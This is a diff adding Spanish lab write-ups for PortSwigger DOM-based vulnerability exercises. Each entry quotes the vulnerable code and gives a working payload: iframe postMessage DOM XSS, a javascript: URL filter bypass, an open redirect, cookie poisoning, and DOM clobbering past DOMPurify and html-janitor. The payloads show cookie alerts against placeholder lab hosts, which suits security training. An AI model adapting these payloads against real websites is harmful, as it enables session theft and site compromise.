@@ -406,6 +406,141 @@ javascript:alert("1337")
 
 ## [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based)
 
+### [DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)
+
+En este laboratorio el sitio vulnerable tiene un event listener `message` con el siguiente código, el cual carga todo el contenido del mensaje en un `div` con id `ads`:
+
+```
+<script>
+    window.addEventListener('message', function(e) {
+        document.getElementById('ads').innerHTML = e.data;
+    })
+</script>
+```
+
+Para resolver el laboratorio, se debe cargar en el exploit server un `iframe`, que al ser cargado envía un web message a la home del sitio vulnerable. El event listener inserta el contenido (es decir, una imagen) en `ads`. Como la imagen tiene un `src` inválido, se ejecuta el handler `onerror`, que muestra las cookies.
+
+```
+<iframe src="https://id-del-laboratorio.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(document.cookie)>','*')">
+```
+
+### [DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)
+
+La home del sitio vulnerable tiene el siguiente event listener, que evalúa si en cualquier parte (no sólo al comienzo) del mensaje está el substring `"http:"` o `"https:"`. En caso afirmativo, lo guarda en `location.href`
+
+```
+<script>
+    window.addEventListener('message', function(e) {
+        var url = e.data;
+        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
+            location.href = url;
+        }
+    }, false);
+</script>
+```
+
+Para resolver el laboratorio se carga en el exploit server un `iframe` que envíe un mensaje que alerte las cookies mediante Javascript, pero al final del mismo se agrega un comentario y la palabra `http:`. Esto hará que se cumpla la condición del event listener, y al mismo tiempo no dará ningún error de sintaxis.
+
+```
+<iframe src="https://id-del-laboratorio.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(document.cookie)//http:','*')">
+```
+
+### [DOM XSS using web messages and `JSON.parse`](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)
+
+El sitio vulnerable tiene un event listener que espera recibir un string que es parseado con `JSON.parse()`. En el objeto parseado se espera que haya una propiedad `type` que es evaluada en un `switch`, y en caso de que tenga el valor `'load-channel'` se cambia el `src` del `iframe` al valor de la propiedad `url` del mismo objeto.
+
+```
+<script>
+    window.addEventListener('message', function(e) {
+        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
+        document.body.appendChild(iframe);
+        try {
+            d = JSON.parse(e.data);
+        } catch(e) {
+            return;
+        }
+        switch(d.type) {
+            case "page-load":
+                ACMEplayer.element.scrollIntoView();
+                break;
+            case "load-channel":
+                ACMEplayer.element.src = d.url;
+                break;
+            case "player-height-changed":
+                ACMEplayer.element.style.width = d.width + "px";
+                ACMEplayer.element.style.height = d.height + "px";
+                break;
+        }
+    }, false);
+</script>
+```
+
+Para resolver el laboratorio se carga en el exploit server un `iframe`, donde el contenido del mensaje sea un string que pueda ser parseado, y que tenga 2 atributos: `type` (cuyo valor es `"load-channel"`) y `url` (cuyo valor es el código que se quiere inyectar).
+
+```
+<iframe src=https://id-del-laboratorio.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(document.cookie)\"}","*")'>
+```
+
+### [DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)
+
+Al ingresar en un posteo del sitio vulnerable, al final de todo hay un link que debería redirigir a la home. En caso de que `returnUrl` tenga un valor *truthy*, se le asignará a `location.href` el valor en la posición 1. Si no, se le asignará `"/"`.
+
+```
+<a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"">Back to Blog</a>
+```
+
+Para resolver el laboratorio, se debe armar una URL similar a la del posteo, pero que al final incluya otro query parameter `url`, cuyo valor sea la URL del exploit server del laboratorio.
+
+```
+https://id-del-laboratorio.web-security-academy.net/post?postId=4&url=https://id-del-exploit-server.web-security-academy.net/
+```
+
+### [DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)
+
+El sitio vulnerable usa una cookie llamada `lastViewedProduct`, cuyo valor es la URL del último producto visitado, y se utiliza en un link dentro de la tienda.
+
+Para resolver el laboratorio, se debe cargar un `iframe` en el exploit server, cuyo source original es igual a la URL de uno de los productos, a menos que se agregue un payload Javascript al final. Cuando el `iframe` carga por primera vez, el navegador abre temporalmente la URL maliciosa, que después se guarda como el valor de dicha cookie. El event handler de `onload` redirige inmediatamente a la home, pero mientras la cookie siga estando envenenada, se va a ejecutar la payload cada vez que se visite la home.
+
+```
+<iframe src="https://id-del-laboratorio.web-security-academy.net/product?productId=1&'><script>alert(document.cookie)</script>" onload="if(!window.x)this.src='https://id-del-laboratorio.web-security-academy.net';window.x=1;">
+```
+
+### [Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)
+
+La pagína de una entrada del blog importa el archivo `loadCommentsWithDomClobbering.js`, el cual contiene el siguiente código:
+
+```
+let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
+```
+
+La variable `defaultAvatar` es vulnerable a DOM clobbering, debido a que está definida con un operador OR y una variable global. Se puede vulnerar esto declarando dos tags `a` con el mismo id, que hará que se agupen en una DOM collection. El `name` del segundo `a` es `avatar`, y su `href` es el código que se quiere inyectar. Pero el sitio vulnerable usa DOMPurify para mitigar los ataques DOM-based, por lo que el `href` tendrá que usar el protocolo `cid:`.
+
+Para resolver el laboratorio se deben hacer dos comentarios en una entrada: uno que contenga el siguiente texto:
+
+```
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
+```
+
+Y otro que contenga cualquier cosa. Al volver a la entrada luego de postear el segundo comentario se va a ejecutar el `alert`.
+
+### [Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)
+
+El sitio usa la librería [html-janitor](https://github.com/guardian/html-janitor) (vulnerable a DOM clobbering y otras cosas), que usa la propiedad `attributes` para filtrar atributos HTML. Pero se puede vulnerar a dicha propiedad ahciendo que su `length` sea indefinido. Esto permite inyectar cualquier atributo en un elemento HTML.
+
+Para resolver el lab se debe realizar un comentario con el texto:
+
+```
+<form id=x tabindex=0 onfocus=alert(document.cookie)><input id=attributes>
+```
+
+Y después cargar en el exploit server:
+
+```
+<iframe src=https://id-del-lab.web-security-academy.net/post?postId=id-del-posteo onload="setTimeout(someArgument=>this.src=this.src+'#x',500)">
+```
+
+Cuando se carga el `iframe`, después de medio segundo (para que se cargue el comentario antes de ejecutarse el JS), se agrega `#x` al final de la URL, haciendo que se enfoque el elemento que tiene ese id (el `form` creado en el comentario). Por último el event handler `onfocus` hace que se ejecute la payload.
+
 ---
 
 ## [Cross-origin resource sharing (CORS)](https://portswigger.net/web-security/cors)
